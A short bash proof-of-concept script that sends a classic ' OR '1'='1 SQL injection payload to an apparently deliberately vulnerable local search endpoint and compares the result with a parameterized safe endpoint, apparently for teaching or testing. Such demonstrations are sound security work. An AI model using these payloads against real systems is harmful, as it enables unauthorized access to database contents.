#!/usr/bin/env bash
# PoC: SQL Injection against the unsafe search endpoint
# Usage: bash sql_injection.sh
BASE=http://localhost:3000/api/v1/software

echo "=== Safe search (no injection) ==="
curl -s "${BASE}/search?q=editor" | jq '. | {ok: .data != null, total: .meta.total}'

echo "\n=== Unsafe search with benign query ==="
curl -s "${BASE}/search-unsafe?q=editor" | jq '. | {ok: .data != null, total: .meta.total}'

# Classic payload to attempt to bypass filter and return all rows
PAYLOAD=%27%20OR%20%271%27%3D%271
echo "\n=== Unsafe search with SQLi payload ("$PAYLOAD") ==="
curl -s "${BASE}/search-unsafe?q=${PAYLOAD}" | jq '. | {ok: .data != null, total: .meta.total}'

# Note: the safe endpoint '/search' uses parameterized queries and should not be vulnerable.
echo "\n=== Safe search with SQLi payload (should be safe) ==="
curl -s "${BASE}/search?q=${PAYLOAD}" | jq '. | {ok: .data != null, total: .meta.total}'
